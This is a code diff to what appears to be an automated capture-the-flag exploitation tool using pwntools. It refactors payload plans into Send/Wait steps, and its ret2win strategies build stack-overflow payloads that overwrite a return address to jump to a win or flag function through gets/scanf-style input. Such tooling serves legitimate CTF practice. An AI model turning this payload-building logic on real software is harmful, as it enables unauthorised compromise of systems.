@@ -10,8 +10,8 @@ from typing import Iterable, Optional
 from pwn import ELF, ROP, asm, context, shellcraft
 
 from .facts import Facts, Vuln
+from .interact import Send, Wait, normalize_steps
 from .model import Challenge
-from .run import execute
 
 TERM_SINKS = ("gets", "scanf", "__isoc99_scanf", "fgets")
 
@@ -19,9 +19,23 @@ TERM_SINKS = ("gets", "scanf", "__isoc99_scanf", "fgets")
 @dataclass
 class Plan:
     strategy: str
-    sends: list[bytes]
+    steps: list
     desc: str = ""
     tag: str = ""
+
+    def __post_init__(self):
+        # 兼容旧写法 Plan("x", [b"...", ...])：裸 bytes 自动包成 Send
+        self.steps = normalize_steps(self.steps)
+
+    @property
+    def sends(self) -> list[bytes]:
+        """只读兼容属性：按顺序取出所有 Send 的原始字节。"""
+        return [s.data for s in self.steps if isinstance(s, Send)]
+
+    @property
+    def last_send(self) -> bytes:
+        sends = self.sends
+        return sends[-1] if sends else b""
 
     def __str__(self) -> str:
         return f"[{self.strategy}] {self.desc}"
@@ -152,8 +166,9 @@ def s_ret2win(ch: Challenge, f: Facts) -> Iterable[Plan]:
             for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                 payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(win.addr) + _term(sink)
                 for m in menu:
-                    sends = ([m] if m else []) + ([pre] if pre else [])
-                    yield Plan("ret2win", sends + [payload],
+                    steps = ([Send(m), Wait()] if m else []) + ([Send(pre)] if pre else [])
+                    steps.append(Send(payload))
+                    yield Plan("ret2win", steps,
                                f"jump to {win.evidence} @ {hex(win.addr)} off={off} "
                                f"align={int(align)}" + (f" menu={m!r}" if m else ""))
 
@@ -360,8 +375,8 @@ def s_ret2win_flag(ch: Challenge, f: Facts) -> Iterable[Plan]:
                 for tgt in targets:
                     payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(tgt) + _term(sink)
                     for m in menu:
-                        sends = ([m] if m else []) + [payload]
-                        yield Plan("ret2flag", sends,
+                        steps = ([Send(m), Wait()] if m else []) + [Send(payload)]
+                        yield Plan("ret2flag", steps,
                                    f"jump to {w.evidence} @ {hex(tgt)} off={off} align={int(align)}"
                                    + (f" menu={m!r}" if m else ""), tag="flag")
 
